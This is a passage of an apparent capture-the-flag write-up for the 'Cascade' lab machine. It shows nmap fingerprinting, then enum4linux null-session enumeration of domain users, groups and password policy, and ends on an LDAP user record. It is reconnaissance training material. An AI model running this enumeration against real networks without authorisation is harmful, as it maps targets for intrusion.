<span class="no">ECN</span><span class="p">(</span><span class="no">R</span><span class="o">=</span><span class="no">Y</span><span class="o">%</span><span class="no">DF</span><span class="o">=</span><span class="no">Y</span><span class="o">%</span><span class="no">TG</span><span class="o">=</span><span class="mi">80</span><span class="o">%</span><span class="no">W</span><span class="o">=</span><span class="mi">2000</span><span class="o">%</span><span class="no">O</span><span class="o">=</span><span class="no">M54DNW8NNS</span><span class="o">%</span><span class="no">CC</span><span class="o">=</span><span class="no">N</span><span class="o">%</span><span class="no">Q</span><span class="o">=</span><span class="p">)</span>
<span class="no">T1</span><span class="p">(</span><span class="no">R</span><span class="o">=</span><span class="no">Y</span><span class="o">%</span><span class="no">DF</span><span class="o">=</span><span class="no">Y</span><span class="o">%</span><span class="no">TG</span><span class="o">=</span><span class="mi">80</span><span class="o">%</span><span class="no">S</span><span class="o">=</span><span class="no">O</span><span class="o">%</span><span class="no">A</span><span class="o">=</span><span class="no">S</span><span class="o">+%</span><span class="no">F</span><span class="o">=</span><span class="no">AS</span><span class="o">%</span><span class="no">RD</span><span class="o">=</span><span class="mi">0</span><span class="o">%</span><span class="no">Q</span><span class="o">=</span><span class="p">)</span>
<span class="no">T2</span><span class="p">(</span><span class="no">R</span><span class="o">=</span><span class="no">N</span><span class="p">)</span>
<span class="no">T3</span><span class="p">(</span><span class="no">R</span><span class="o">=</span><span class="no">N</span><span class="p">)</span>
<span class="no">T4</span><span class="p">(</span><span class="no">R</span><span class="o">=</span><span class="no">N</span><span class="p">)</span>
<span class="no">U1</span><span class="p">(</span><span class="no">R</span><span class="o">=</span><span class="no">N</span><span class="p">)</span>
<span class="no">IE</span><span class="p">(</span><span class="no">R</span><span class="o">=</span><span class="no">Y</span><span class="o">%</span><span class="no">DFI</span><span class="o">=</span><span class="no">N</span><span class="o">%</span><span class="no">TG</span><span class="o">=</span><span class="mi">80</span><span class="o">%</span><span class="no">CD</span><span class="o">=</span><span class="no">Z</span><span class="p">)</span>

<span class="no">Uptime</span> <span class="ss">guess: </span><span class="mf">0.479</span> <span class="n">days</span> <span class="p">(</span><span class="n">since</span> <span class="no">Wed</span> <span class="no">Jul</span> <span class="mi">22</span> <span class="mi">15</span><span class="p">:</span><span class="mi">26</span><span class="p">:</span><span class="mi">52</span> <span class="mi">2020</span><span class="p">)</span>
<span class="no">Network</span> <span class="no">Distance</span><span class="p">:</span> <span class="mi">2</span> <span class="n">hops</span>
<span class="no">TCP</span> <span class="no">Sequence</span> <span class="no">Prediction</span><span class="p">:</span> <span class="no">Difficulty</span><span class="o">=</span><span class="mi">253</span> <span class="p">(</span><span class="no">Good</span> <span class="n">luck!</span><span class="p">)</span>
<span class="no">IP</span> <span class="no">ID</span> <span class="no">Sequence</span> <span class="no">Generation</span><span class="p">:</span> <span class="no">Incremental</span>
<span class="no">Service</span> <span class="no">Info</span><span class="p">:</span> <span class="no">Host</span><span class="p">:</span> <span class="no">CASC</span><span class="o">-</span><span class="no">DC1</span><span class="p">;</span> <span class="no">OS</span><span class="p">:</span> <span class="no">Windows</span><span class="p">;</span> <span class="no">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="ss">:/</span><span class="n">o</span><span class="ss">\:microsoft\:windows_server_2008\:r2\:sp1</span><span class="p">,</span> <span class="n">cpe</span><span class="ss">:/</span><span class="n">o</span><span class="ss">\:microsoft\:windows</span>

<span class="no">Host</span> <span class="n">script</span> <span class="ss">results:
</span><span class="o">|</span><span class="n">_clock</span><span class="o">-</span><span class="ss">skew: </span><span class="mi">3</span><span class="n">m22s</span>
<span class="o">|</span> <span class="n">p2p</span><span class="o">-</span><span class="ss">conficker: 
</span><span class="o">|</span>   <span class="no">Checking</span> <span class="k">for</span> <span class="no">Conficker</span><span class="o">.</span><span class="no">C</span> <span class="n">or</span> <span class="n">higher</span><span class="o">...</span>
<span class="o">|</span>   <span class="no">Check</span> <span class="mi">1</span> <span class="p">(</span><span class="n">port</span> <span class="mi">62331</span><span class="o">/</span><span class="n">tcp</span><span class="p">):</span> <span class="no">CLEAN</span> <span class="p">(</span><span class="no">Timeout</span><span class="p">)</span>
<span class="o">|</span>   <span class="no">Check</span> <span class="mi">2</span> <span class="p">(</span><span class="n">port</span> <span class="mi">51409</span><span class="o">/</span><span class="n">tcp</span><span class="p">):</span> <span class="no">CLEAN</span> <span class="p">(</span><span class="no">Timeout</span><span class="p">)</span>
<span class="o">|</span>   <span class="no">Check</span> <span class="mi">3</span> <span class="p">(</span><span class="n">port</span> <span class="mi">10882</span><span class="o">/</span><span class="n">udp</span><span class="p">):</span> <span class="no">CLEAN</span> <span class="p">(</span><span class="no">Timeout</span><span class="p">)</span>
<span class="o">|</span>   <span class="no">Check</span> <span class="mi">4</span> <span class="p">(</span><span class="n">port</span> <span class="mi">53799</span><span class="o">/</span><span class="n">udp</span><span class="p">):</span> <span class="no">CLEAN</span> <span class="p">(</span><span class="no">Timeout</span><span class="p">)</span>
<span class="o">|</span><span class="n">_</span>  <span class="mi">0</span><span class="o">/</span><span class="mi">4</span> <span class="n">checks</span> <span class="n">are</span> <span class="ss">positive: </span><span class="no">Host</span> <span class="n">is</span> <span class="no">CLEAN</span> <span class="n">or</span> <span class="n">ports</span> <span class="n">are</span> <span class="n">blocked</span>
<span class="o">|</span> <span class="n">smb2</span><span class="o">-</span><span class="n">security</span><span class="o">-</span><span class="ss">mode: 
</span><span class="o">|</span>   <span class="mf">2.02</span><span class="p">:</span> 
<span class="o">|</span><span class="n">_</span>    <span class="no">Message</span> <span class="n">signing</span> <span class="n">enabled</span> <span class="n">and</span> <span class="n">required</span>
<span class="o">|</span> <span class="n">smb2</span><span class="o">-</span><span class="ss">time: 
</span><span class="o">|</span>   <span class="ss">date: </span><span class="mi">2020</span><span class="o">-</span><span class="mo">07</span><span class="o">-</span><span class="mi">23</span><span class="no">T06</span><span class="p">:</span><span class="mi">57</span><span class="p">:</span><span class="mi">09</span>
<span class="o">|</span><span class="n">_</span>  <span class="ss">start_date: </span><span class="mi">2020</span><span class="o">-</span><span class="mo">07</span><span class="o">-</span><span class="mi">22</span><span class="no">T19</span><span class="p">:</span><span class="mi">30</span><span class="p">:</span><span class="mi">40</span>

<span class="no">TRACEROUTE</span> <span class="p">(</span><span class="n">using</span> <span class="n">port</span> <span class="mi">445</span><span class="o">/</span><span class="n">tcp</span><span class="p">)</span>
<span class="no">HOP</span> <span class="no">RTT</span>       <span class="no">ADDRESS</span>
<span class="mi">1</span>   <span class="mf">184.36</span> <span class="n">ms</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">14.1</span>
<span class="mi">2</span>   <span class="mf">184.52</span> <span class="n">ms</span> <span class="n">cascade</span><span class="p">.</span><span class="nf">htb</span> <span class="p">(</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.182</span><span class="p">)</span>

<span class="no">NSE</span><span class="p">:</span> <span class="no">Script</span> <span class="no">Post</span><span class="o">-</span><span class="n">scanning</span><span class="o">.</span>
<span class="no">NSE</span><span class="p">:</span> <span class="no">Starting</span> <span class="n">runlevel</span> <span class="mi">1</span> <span class="p">(</span><span class="n">of</span> <span class="mi">3</span><span class="p">)</span> <span class="nb">scan</span><span class="o">.</span>
<span class="no">Initiating</span> <span class="no">NSE</span> <span class="n">at</span> <span class="mo">02</span><span class="p">:</span><span class="mi">56</span>
<span class="no">Completed</span> <span class="no">NSE</span> <span class="n">at</span> <span class="mo">02</span><span class="p">:</span><span class="mi">56</span><span class="p">,</span> <span class="mf">0.00</span><span class="n">s</span> <span class="n">elapsed</span>
<span class="no">NSE</span><span class="p">:</span> <span class="no">Starting</span> <span class="n">runlevel</span> <span class="mi">2</span> <span class="p">(</span><span class="n">of</span> <span class="mi">3</span><span class="p">)</span> <span class="nb">scan</span><span class="o">.</span>
<span class="no">Initiating</span> <span class="no">NSE</span> <span class="n">at</span> <span class="mo">02</span><span class="p">:</span><span class="mi">56</span>
<span class="no">Completed</span> <span class="no">NSE</span> <span class="n">at</span> <span class="mo">02</span><span class="p">:</span><span class="mi">56</span><span class="p">,</span> <span class="mf">0.00</span><span class="n">s</span> <span class="n">elapsed</span>
<span class="no">NSE</span><span class="p">:</span> <span class="no">Starting</span> <span class="n">runlevel</span> <span class="mi">3</span> <span class="p">(</span><span class="n">of</span> <span class="mi">3</span><span class="p">)</span> <span class="nb">scan</span><span class="o">.</span>
<span class="no">Initiating</span> <span class="no">NSE</span> <span class="n">at</span> <span class="mo">02</span><span class="p">:</span><span class="mi">56</span>
<span class="no">Completed</span> <span class="no">NSE</span> <span class="n">at</span> <span class="mo">02</span><span class="p">:</span><span class="mi">56</span><span class="p">,</span> <span class="mf">0.00</span><span class="n">s</span> <span class="n">elapsed</span>
<span class="no">Read</span> <span class="n">data</span> <span class="n">files</span> <span class="ss">from: </span><span class="sr">/usr/</span><span class="n">bin</span><span class="o">/..</span><span class="sr">/share/nm</span><span class="n">ap</span>
<span class="no">OS</span> <span class="n">and</span> <span class="no">Service</span> <span class="n">detection</span> <span class="n">performed</span><span class="o">.</span> <span class="no">Please</span> <span class="n">report</span> <span class="n">any</span> <span class="n">incorrect</span> <span class="n">results</span> <span class="n">at</span> <span class="n">https</span><span class="ss">:/</span><span class="o">/</span><span class="n">nmap</span><span class="p">.</span><span class="nf">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span> <span class="o">.</span>
<span class="no">Nmap</span> <span class="ss">done: </span><span class="mi">1</span> <span class="no">IP</span> <span class="n">address</span> <span class="p">(</span><span class="mi">1</span> <span class="n">host</span> <span class="n">up</span><span class="p">)</span> <span class="n">scanned</span> <span class="k">in</span> <span class="mf">248.12</span> <span class="n">seconds</span>
           <span class="no">Raw</span> <span class="n">packets</span> <span class="ss">sent: </span><span class="mi">2074</span> <span class="p">(</span><span class="mf">94.964</span><span class="no">KB</span><span class="p">)</span> <span class="o">|</span> <span class="no">Rcvd</span><span class="p">:</span> <span class="mi">144</span> <span class="p">(</span><span class="mf">20.275</span><span class="no">KB</span><span class="p">)</span>
</code></pre></div></div>

<h2 id="enum4linux">Enum4linux</h2>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">enum4linux</span> <span class="o">-</span><span class="n">a</span> <span class="n">cascade</span><span class="p">.</span><span class="n">htb</span>
<span class="n">Starting</span> <span class="n">enum4linux</span> <span class="n">v0</span><span class="p">.</span><span class="mf">8.9</span> <span class="p">(</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">labs</span><span class="p">.</span><span class="n">portcullis</span><span class="p">.</span><span class="n">co</span><span class="p">.</span><span class="n">uk</span><span class="o">/</span><span class="n">application</span><span class="o">/</span><span class="n">enum4linux</span><span class="o">/</span> <span class="p">)</span> <span class="n">on</span> <span class="n">Thu</span> <span class="n">Jul</span> <span class="mi">23</span> <span class="mi">02</span><span class="p">:</span><span class="mi">47</span><span class="p">:</span><span class="mi">55</span> <span class="mi">2020</span>

 <span class="o">==========================</span> 
<span class="o">|</span>    <span class="n">Target</span> <span class="n">Information</span>    <span class="o">|</span>
 <span class="o">==========================</span> 
<span class="n">Target</span> <span class="p">...........</span> <span class="n">cascade</span><span class="p">.</span><span class="n">htb</span>
<span class="n">RID</span> <span class="n">Range</span> <span class="p">........</span> <span class="mi">500</span><span class="o">-</span><span class="mi">550</span><span class="p">,</span><span class="mi">1000</span><span class="o">-</span><span class="mi">1050</span>
<span class="n">Username</span> <span class="p">.........</span> <span class="s">''</span>
<span class="n">Password</span> <span class="p">.........</span> <span class="s">''</span>
<span class="n">Known</span> <span class="n">Usernames</span> <span class="p">..</span> <span class="n">administrator</span><span class="p">,</span> <span class="n">guest</span><span class="p">,</span> <span class="n">krbtgt</span><span class="p">,</span> <span class="n">domain</span> <span class="n">admins</span><span class="p">,</span> <span class="n">root</span><span class="p">,</span> <span class="nb">bin</span><span class="p">,</span> <span class="n">none</span>


 <span class="o">===================================================</span> 
<span class="o">|</span>    <span class="n">Enumerating</span> <span class="n">Workgroup</span><span class="o">/</span><span class="n">Domain</span> <span class="n">on</span> <span class="n">cascade</span><span class="p">.</span><span class="n">htb</span>    <span class="o">|</span>
 <span class="o">===================================================</span> 
<span class="p">[</span><span class="n">E</span><span class="p">]</span> <span class="n">Can</span><span class="s">'t find workgroup/domain


 =========================================== 
|    Nbtstat Information for cascade.htb    |
 =========================================== 
Looking up status of 10.10.10.182
No reply from 10.10.10.182

 ==================================== 
|    Session Check on cascade.htb    |
 ==================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
[+] Server cascade.htb allows sessions using username '', password ''
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.
[+] Got domain/workgroup name: 

 ========================================== 
|    Getting domain SID for cascade.htb    |
 ========================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.
Domain Name: CASCADE
Domain Sid: S-1-5-21-3332504370-1206983947-1165150453
[+] Host is part of a domain (not a workgroup)

 ===================================== 
|    OS information on cascade.htb    |
 ===================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 458.
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for cascade.htb from smbclient: 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 467.
[+] Got OS info for cascade.htb from srvinfo:
Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED

 ============================ 
|    Users on cascade.htb    |
 ============================ 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.
index: 0xee0 RID: 0x464 acb: 0x00000214 Account: a.turnbull     Name: Adrian Turnbull   Desc: (null)
index: 0xebc RID: 0x452 acb: 0x00000210 Account: arksvc Name: ArkSvc    Desc: (null)
index: 0xee4 RID: 0x468 acb: 0x00000211 Account: b.hanson       Name: Ben Hanson        Desc: (null)
index: 0xee7 RID: 0x46a acb: 0x00000210 Account: BackupSvc      Name: BackupSvc Desc: (null)
index: 0xdeb RID: 0x1f5 acb: 0x00000215 Account: CascGuest      Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0xee5 RID: 0x469 acb: 0x00000210 Account: d.burman       Name: David Burman      Desc: (null)
index: 0xee3 RID: 0x467 acb: 0x00000211 Account: e.crowe        Name: Edward Crowe      Desc: (null)
index: 0xeec RID: 0x46f acb: 0x00000211 Account: i.croft        Name: Ian Croft Desc: (null)
index: 0xeeb RID: 0x46e acb: 0x00000210 Account: j.allen        Name: Joseph Allen      Desc: (null)
index: 0xede RID: 0x462 acb: 0x00000210 Account: j.goodhand     Name: John Goodhand     Desc: (null)
index: 0xed7 RID: 0x45c acb: 0x00000210 Account: j.wakefield    Name: James Wakefield   Desc: (null)
index: 0xeca RID: 0x455 acb: 0x00000210 Account: r.thompson     Name: Ryan Thompson     Desc: (null)
index: 0xedd RID: 0x461 acb: 0x00000210 Account: s.hickson      Name: Stephanie Hickson Desc: (null)
index: 0xebd RID: 0x453 acb: 0x00000210 Account: s.smith        Name: Steve Smith       Desc: (null)
index: 0xed2 RID: 0x457 acb: 0x00000210 Account: util   Name: Util      Desc: (null)

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.
user:[CascGuest] rid:[0x1f5]
user:[arksvc] rid:[0x452]
user:[s.smith] rid:[0x453]
user:[r.thompson] rid:[0x455]
user:[util] rid:[0x457]
user:[j.wakefield] rid:[0x45c]
user:[s.hickson] rid:[0x461]
user:[j.goodhand] rid:[0x462]
user:[a.turnbull] rid:[0x464]
user:[e.crowe] rid:[0x467]
user:[b.hanson] rid:[0x468]
user:[d.burman] rid:[0x469]
user:[BackupSvc] rid:[0x46a]
user:[j.allen] rid:[0x46e]
user:[i.croft] rid:[0x46f]

 ======================================== 
|    Share Enumeration on cascade.htb    |
 ======================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.

        Sharename       Type      Comment
        ---------       ----      -------
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on cascade.htb

 =================================================== 
|    Password Policy Information for cascade.htb    |
 =================================================== 


[+] Attaching to cascade.htb using a NULL share

[+] Trying protocol 445/SMB...

[+] Found domain(s):

        [+] CASCADE
        [+] Builtin

[+] Password Info for Domain: CASCADE

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: Not Set
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: Not Set

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.

[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 5


 ============================= 
|    Groups on cascade.htb    |
 ============================= 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.

[+] Getting builtin groups:
group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
group:[Incoming Forest Trust Builders] rid:[0x22d]
group:[Windows Authorization Access Group] rid:[0x230]
group:[Terminal Server License Servers] rid:[0x231]
group:[Users] rid:[0x221]
group:[Guests] rid:[0x222]
group:[Remote Desktop Users] rid:[0x22b]
group:[Network Configuration Operators] rid:[0x22c]
group:[Performance Monitor Users] rid:[0x22e]
group:[Performance Log Users] rid:[0x22f]
group:[Distributed COM Users] rid:[0x232]
group:[IIS_IUSRS] rid:[0x238]
group:[Cryptographic Operators] rid:[0x239]
group:[Event Log Readers] rid:[0x23d]
group:[Certificate Service DCOM Access] rid:[0x23e]

[+] Getting builtin group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group '</span><span class="n">Pre</span><span class="o">-</span><span class="n">Windows</span> <span class="mi">2000</span> <span class="n">Compatible</span> <span class="n">Access</span><span class="s">' (RID: 554) has member: NT AUTHORITY\Authenticated Users
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group '</span><span class="n">Guests</span><span class="s">' (RID: 546) has member: CASCADE\CascGuest
Group '</span><span class="n">Guests</span><span class="s">' (RID: 546) has member: CASCADE\Domain Guests
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group '</span><span class="n">Users</span><span class="s">' (RID: 545) has member: NT AUTHORITY\INTERACTIVE
Group '</span><span class="n">Users</span><span class="s">' (RID: 545) has member: NT AUTHORITY\Authenticated Users
Group '</span><span class="n">Users</span><span class="s">' (RID: 545) has member: CASCADE\Domain Users
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group '</span><span class="n">Windows</span> <span class="n">Authorization</span> <span class="n">Access</span> <span class="n">Group</span><span class="s">' (RID: 560) has member: NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.

[+] Getting local groups:
group:[Cert Publishers] rid:[0x205]
group:[RAS and IAS Servers] rid:[0x229]
group:[Allowed RODC Password Replication Group] rid:[0x23b]
group:[Denied RODC Password Replication Group] rid:[0x23c]
group:[DnsAdmins] rid:[0x44e]
group:[IT] rid:[0x459]
group:[Production] rid:[0x45a]
group:[HR] rid:[0x45b]
group:[AD Recycle Bin] rid:[0x45f]
group:[Backup] rid:[0x460]
group:[Temps] rid:[0x463]
group:[WinRMRemoteWMIUsers__] rid:[0x465]
group:[Remote Management Users] rid:[0x466]
group:[Factory] rid:[0x46c]
group:[Finance] rid:[0x46d]
group:[Audit Share] rid:[0x471]
group:[Data Share] rid:[0x472]

[+] Getting local group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group '</span><span class="n">HR</span><span class="s">' (RID: 1115) has member: CASCADE\s.hickson
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group '</span><span class="n">Denied</span> <span class="n">RODC</span> <span class="n">Password</span> <span class="n">Replication</span> <span class="n">Group</span><span class="s">' (RID: 572) has member: CASCADE\krbtgt
Group '</span><span class="n">Denied</span> <span class="n">RODC</span> <span class="n">Password</span> <span class="n">Replication</span> <span class="n">Group</span><span class="s">' (RID: 572) has member: CASCADE\Domain Controllers
Group '</span><span class="n">Denied</span> <span class="n">RODC</span> <span class="n">Password</span> <span class="n">Replication</span> <span class="n">Group</span><span class="s">' (RID: 572) has member: CASCADE\Schema Admins
Group '</span><span class="n">Denied</span> <span class="n">RODC</span> <span class="n">Password</span> <span class="n">Replication</span> <span class="n">Group</span><span class="s">' (RID: 572) has member: CASCADE\Enterprise Admins
Group '</span><span class="n">Denied</span> <span class="n">RODC</span> <span class="n">Password</span> <span class="n">Replication</span> <span class="n">Group</span><span class="s">' (RID: 572) has member: CASCADE\Cert Publishers
Group '</span><span class="n">Denied</span> <span class="n">RODC</span> <span class="n">Password</span> <span class="n">Replication</span> <span class="n">Group</span><span class="s">' (RID: 572) has member: CASCADE\Domain Admins
Group '</span><span class="n">Denied</span> <span class="n">RODC</span> <span class="n">Password</span> <span class="n">Replication</span> <span class="n">Group</span><span class="s">' (RID: 572) has member: CASCADE\Group Policy Creator Owners
Group '</span><span class="n">Denied</span> <span class="n">RODC</span> <span class="n">Password</span> <span class="n">Replication</span> <span class="n">Group</span><span class="s">' (RID: 572) has member: CASCADE\Read-only Domain Controllers
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group '</span><span class="n">IT</span><span class="s">' (RID: 1113) has member: CASCADE</span><span class="se">\a</span><span class="s">rksvc
Group '</span><span class="n">IT</span><span class="s">' (RID: 1113) has member: CASCADE\s.smith
Group '</span><span class="n">IT</span><span class="s">' (RID: 1113) has member: CASCADE</span><span class="se">\r</span><span class="s">.thompson
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group '</span><span class="n">Data</span> <span class="n">Share</span><span class="s">' (RID: 1138) has member: CASCADE\Domain Users
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group '</span><span class="n">Audit</span> <span class="n">Share</span><span class="s">' (RID: 1137) has member: CASCADE\s.smith
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group '</span><span class="n">Remote</span> <span class="n">Management</span> <span class="n">Users</span><span class="s">' (RID: 1126) has member: CASCADE</span><span class="se">\a</span><span class="s">rksvc
Group '</span><span class="n">Remote</span> <span class="n">Management</span> <span class="n">Users</span><span class="s">' (RID: 1126) has member: CASCADE\s.smith
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Group '</span><span class="n">AD</span> <span class="n">Recycle</span> <span class="n">Bin</span><span class="s">' (RID: 1119) has member: CASCADE</span><span class="se">\a</span><span class="s">rksvc
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 574.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 593.

[+] Getting domain groups:
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Group Policy Creator Owners] rid:[0x208]
group:[DnsUpdateProxy] rid:[0x44f]

[+] Getting domain group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group '</span><span class="n">Domain</span> <span class="n">Users</span><span class="s">' (RID: 513) has member: CASCADE</span><span class="se">\a</span><span class="s">dministrator
Group '</span><span class="n">Domain</span> <span class="n">Users</span><span class="s">' (RID: 513) has member: CASCADE\krbtgt
Group '</span><span class="n">Domain</span> <span class="n">Users</span><span class="s">' (RID: 513) has member: CASCADE</span><span class="se">\a</span><span class="s">rksvc
Group '</span><span class="n">Domain</span> <span class="n">Users</span><span class="s">' (RID: 513) has member: CASCADE\s.smith
Group '</span><span class="n">Domain</span> <span class="n">Users</span><span class="s">' (RID: 513) has member: CASCADE</span><span class="se">\r</span><span class="s">.thompson
Group '</span><span class="n">Domain</span> <span class="n">Users</span><span class="s">' (RID: 513) has member: CASCADE\util
Group '</span><span class="n">Domain</span> <span class="n">Users</span><span class="s">' (RID: 513) has member: CASCADE\j.wakefield
Group '</span><span class="n">Domain</span> <span class="n">Users</span><span class="s">' (RID: 513) has member: CASCADE\s.hickson
Group '</span><span class="n">Domain</span> <span class="n">Users</span><span class="s">' (RID: 513) has member: CASCADE\j.goodhand
Group '</span><span class="n">Domain</span> <span class="n">Users</span><span class="s">' (RID: 513) has member: CASCADE</span><span class="se">\a</span><span class="s">.turnbull
Group '</span><span class="n">Domain</span> <span class="n">Users</span><span class="s">' (RID: 513) has member: CASCADE\e.crowe
Group '</span><span class="n">Domain</span> <span class="n">Users</span><span class="s">' (RID: 513) has member: CASCADE</span><span class="se">\b</span><span class="s">.hanson
Group '</span><span class="n">Domain</span> <span class="n">Users</span><span class="s">' (RID: 513) has member: CASCADE\d.burman
Group '</span><span class="n">Domain</span> <span class="n">Users</span><span class="s">' (RID: 513) has member: CASCADE\BackupSvc
Group '</span><span class="n">Domain</span> <span class="n">Users</span><span class="s">' (RID: 513) has member: CASCADE\j.allen
Group '</span><span class="n">Domain</span> <span class="n">Users</span><span class="s">' (RID: 513) has member: CASCADE\i.croft
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group '</span><span class="n">Domain</span> <span class="n">Guests</span><span class="s">' (RID: 514) has member: CASCADE\CascGuest
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Group '</span><span class="n">Group</span> <span class="n">Policy</span> <span class="n">Creator</span> <span class="n">Owners</span><span class="s">' (RID: 520) has member: CASCADE</span><span class="se">\a</span><span class="s">dministrator
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 614.
</span></code></pre></div></div>

<h2 id="using-ldap-search">Using Ldap Search—</h2>

<h2 id="intresting-findings-from-ldapsearch">Intresting findings from <code class="language-plaintext highlighter-rouge">ldapsearch</code>
</h2>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dn: <span class="nv">CN</span><span class="o">=</span>Ryan Thompson,OU<span class="o">=</span>Users,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Ryan Thompson
sn: Thompson
givenName: Ryan
distinguishedName: <span class="nv">CN</span><span class="o">=</span>Ryan Thompson,OU<span class="o">=</span>Users,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>instanceType: 4
whenCreated: 20200109193126.0Z
whenChanged: 20200323112031.0Z
displayName: Ryan Thompson
uSNCreated: 24610
memberOf: <span class="nv">CN</span><span class="o">=</span>IT,OU<span class="o">=</span>Groups,OU<span class="o">=</span>UK,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>uSNChanged: 295010
name: Ryan Thompson
objectGUID:: <span class="nv">LfpD6qngUkupEy9bFXBBjA</span><span class="o">==</span>
userAccountControl: 66048
badPwdCount: 8
codePage: 0
countryCode: 0
badPasswordTime: 132299219591809760
lastLogoff: 0
lastLogon: 132299203623153712
pwdLastSet: 132230718862636251
primaryGroupID: 513
objectSid:: <span class="nv">AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA</span><span class="o">==</span>
accountExpires: 9223372036854775807
logonCount: 2
sAMAccountName: r.thompson
sAMAccountType: 805306368
userPrincipalName: r.thompson@cascade.local
